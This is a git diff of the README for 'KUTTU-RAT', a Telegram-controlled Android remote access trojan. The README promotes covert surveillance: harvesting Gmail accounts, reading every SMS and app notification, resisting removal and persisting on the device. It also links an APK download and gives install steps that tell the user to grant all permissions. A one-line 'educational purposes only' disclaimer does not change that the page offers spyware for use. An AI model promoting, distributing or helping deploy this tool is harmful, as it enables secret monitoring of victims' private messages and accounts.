@@ -1,23 +1,46 @@
 <p align="center">
   <img width="250" height="250" src="https://media3.giphy.com/media/XALwMpWaCJ5gr4Fcps/giphy.gif?cid=6c09b952upcyl1meas3obbs87sia3e1etx3x9i8ef68mxvwq&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=s">
 </p>
-<h1 align="center">KUTTU-RAT</h1><p align="center">
-<b>⚠️Disclaimer : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.
-</p>   
 
-<p align=center>  
-<a href=https://www.instagram.com/ashwin_hackr?igsh=MXZxbWVwcWs3bHZuMA==><img src="https://img.shields.io/badge/Author-Ashwin-red.svg?style=for-the-badge&label=Author" /></a>
+<h1 align="center">KUTTU-RAT</h1>
 
-<img src="https://img.shields.io/badge/Version-1.0-brightgreen?style=for-the-badge" >
-</p>   
+<p align="center">
+  <b>⚠️ Disclaimer:</b> This software is meant for educational purposes only. 
+  <br>I'm not responsible for any malicious use of the app.
+</p>
 
+<p align="center">  
+  <a href="https://www.instagram.com/ashwin_hackr?igsh=MXZxbWVwcWs3bHZuMA==">
+    <img src="https://img.shields.io/badge/Author-Ashwin-red.svg?style=for-the-badge&label=Author" />
+  </a>
+  <img src="https://img.shields.io/badge/Version-1.0-brightgreen?style=for-the-badge">
+</p>
 
-### Features
-- Get all gmail list(List of all Gmail accounts installed on mobile phones)
-- Read all incoming notifications any apps(Whatsapp,Instagram,etc)
-- Read all incoming SMS
-- Working all latest android versions(10 to 15)
-- No need port forwarding
-- Telegram based rat
-- Cannot delete.
-- Persistence
+---
+
+## 🚀 Features  
+✔️ **Retrieve Gmail List** – Get a list of all Gmail accounts installed on the device.  
+✔️ **Read All Incoming Notifications** – Works with all apps (WhatsApp, Instagram, etc.).  
+✔️ **Read All Incoming SMS** – Captures every SMS received.  
+✔️ **Compatible with Android 10 to 15** – Works on all latest Android versions.  
+✔️ **No Port Forwarding Needed** – Operates entirely via Telegram.  
+✔️ **Telegram-Based RAT** – Control everything through a Telegram bot.  
+✔️ **Undeletable** – App cannot be removed manually.  
+✔️ **Persistence** – Ensures continuous operation without interruption.  
+
+---
+
+## 📽️ Demo  
+[![KUTTU Demo](https://img.youtube.com/vi/StTqXEQ2l-Y/0.jpg)](https://www.youtube.com/watch?v=StTqXEQ2l-Y "Click to Play")
+
+---
+
+### ℹ️ **Installation Guide**
+1. **Download APK** → [Click Here](apk/KUTTU.apk)  
+2. **Install the APK** on your Android device.  
+3. **Grant all necessary permissions** when prompted.  
+4. **Connect to Telegram Bot** by following the setup instructions.  
+
+---
+
+### 📁 **Project Structure**
